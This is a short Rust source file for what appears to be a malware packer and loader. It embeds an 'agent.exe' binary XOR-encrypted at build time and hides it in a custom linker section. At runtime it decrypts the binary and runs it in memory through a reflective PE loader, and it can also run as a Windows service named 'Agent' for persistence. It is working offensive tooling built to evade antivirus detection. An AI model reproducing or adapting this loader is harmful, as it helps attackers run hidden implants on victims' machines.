#[cfg(feature = "windows-service")]
use windows_service::{
    define_windows_service,
    service::{
        ServiceControl, ServiceControlAccept, ServiceExitCode, ServiceState, ServiceStatus,
        ServiceType,
    },
    service_control_handler::{self, ServiceControlHandlerResult},
};

#[cfg(feature = "windows-service")]
define_windows_service!(ffi_service_main, service_main);

#[link_section = "bin"]
#[used]
static mut AGENT_BIN: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/agent.exe")); // Reference stored in .bin, data stored in .rdata

const XOR_KEY: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/xor_key"));

#[cfg(feature = "windows-service")]
const SERVICE_NAME: &str = "Agent";

// TODO Separate the service code from the packer code
#[cfg(feature = "windows-service")]
fn service_main(_arguments: Vec<std::ffi::OsString>) {
    // Register system service event handler
    let status_handle = service_control_handler::register(
        SERVICE_NAME,
        move |control_event| -> ServiceControlHandlerResult {
            match control_event {
                ServiceControl::Stop | ServiceControl::Interrogate => {
                    ServiceControlHandlerResult::NoError
                }
                _ => ServiceControlHandlerResult::NotImplemented,
            }
        },
    )
    .unwrap();

    // Tell the system that the service is running now
    status_handle
        .set_service_status(ServiceStatus {
            service_type: ServiceType::OWN_PROCESS,
            current_state: ServiceState::Running,
            controls_accepted: ServiceControlAccept::STOP,
            exit_code: ServiceExitCode::Win32(0),
            checkpoint: 0,
            wait_hint: std::time::Duration::default(),
            process_id: None,
        })
        .unwrap();

    unsafe { load() }
}

#[allow(static_mut_refs)]
unsafe fn load() {
    rspe::reflective_loader(common::unpack_to_vec(AGENT_BIN, XOR_KEY));
}

// TODO Fix bug: two processes are created instead of one
fn main() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(feature = "windows-service")]
    windows_service::service_dispatcher::start(SERVICE_NAME, ffi_service_main)?;
    #[cfg(not(feature = "windows-service"))]
    unsafe {
        load();
    }
    Ok(())
}
